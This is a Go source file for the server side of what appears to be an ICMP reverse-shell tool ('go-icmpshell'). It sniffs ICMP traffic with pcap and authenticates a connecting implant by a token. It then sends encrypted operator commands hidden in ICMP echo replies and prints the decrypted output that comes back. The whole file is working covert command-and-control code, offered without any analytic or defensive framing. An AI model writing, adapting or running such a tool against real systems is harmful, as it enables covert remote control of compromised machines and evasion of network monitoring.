package server

import (
	"bufio"
	"bytes"
	"fmt"
	"github.com/d1nfinite/go-icmpshell/common"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/routing"
	"os"
)

type Server struct {
	pcapListenHandle *pcap.Handle
	icmpId           uint16
	tokenCheck       bool
	receiveConnect   chan struct{}
	common.Auth
	common.Communicate
}

type Option func(shell *Server) *Server

func WithToken(token []byte) Option {
	return func(server *Server) *Server {
		server.Token = token
		return server
	}
}

func NewServer(opts ...Option) (*Server, error) {
	s := &Server{
		tokenCheck:     false,
		receiveConnect: make(chan struct{}, 1),
	}

	// Options
	for _, opt := range opts {
		s = opt(s)
	}

	// Open handle
	handle, err := pcap.OpenLive("any", 65536, false, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	s.pcapListenHandle = handle

	return s, nil
}

func (s *Server) StartupShell() error {
	<-s.receiveConnect
	reader := bufio.NewScanner(os.Stdin)
	for reader.Scan() {
		command := reader.Text()
		if command == "" {
			continue
		}

		commandEncrypt, err := s.Encrypt([]byte(command))
		if err != nil {
			fmt.Println(err)
			continue
		}

		err = s.SendICMP(commandEncrypt, s.icmpId, layers.ICMPv4TypeEchoReply)
		if err != nil {
			fmt.Println(err)
		}
	}

	return nil
}

func (s *Server) ListenICMP() {
	s.pcapListenHandle.SetBPFFilter("icmp")

	packetSource := gopacket.NewPacketSource(s.pcapListenHandle, s.pcapListenHandle.LinkType())
	for packet := range packetSource.Packets() {
		icmpLayer := packet.Layer(layers.LayerTypeICMPv4)
		if icmpLayer == nil {
			continue
		}

		switch v := icmpLayer.(type) {
		case *layers.ICMPv4:
			// Flow check
			if bytes.Compare(packet.NetworkLayer().NetworkFlow().Src().Raw(), s.Src) == 0 {
				continue
			}

			// Token check
			if bytes.Compare(v.Payload, s.Token) == 0 {
				fmt.Println("Receive connect from shell")
				s.icmpId = v.Id
				s.Seq = v.Seq
				err := s.handleReceiveConnect(packet)
				if err != nil {
					fmt.Println(err)
					continue
				}
				s.tokenCheck = true
				s.receiveConnect <- struct{}{}
				continue
			}

			if s.tokenCheck {
				outputDecrypt, err := s.Decrypt(v.Payload)
				if err != nil {
					fmt.Println(err)
					continue
				}

				os.Stdout.Write(outputDecrypt)
			}
		}
	}
}

func (s *Server) handleReceiveConnect(packet gopacket.Packet) error {
	for _, layer := range packet.Layers() {
		switch v := layer.(type) {
		case gopacket.NetworkLayer:
			switch vv := v.(type) {
			case *layers.IPv4:
				s.Dst = vv.SrcIP
				router, err := routing.New()
				if err != nil {
					return err
				}

				iface, gw, src, err := router.Route(s.Dst)
				if err != nil {
					return err
				}

				s.Iface = iface
				s.Gateway = gw
				s.Src = src

				// Open Send handle
				handle, err := pcap.OpenLive(iface.Name, 65536, false, pcap.BlockForever)
				if err != nil {
					return err
				}
				s.PcapSendHandle = handle

				// Get dst hw addr
				hwAddr, err := s.GetHwAddr()
				if err != nil {
					return err
				}
				s.DstHwAddr = hwAddr
			}
		}
	}

	return nil
}
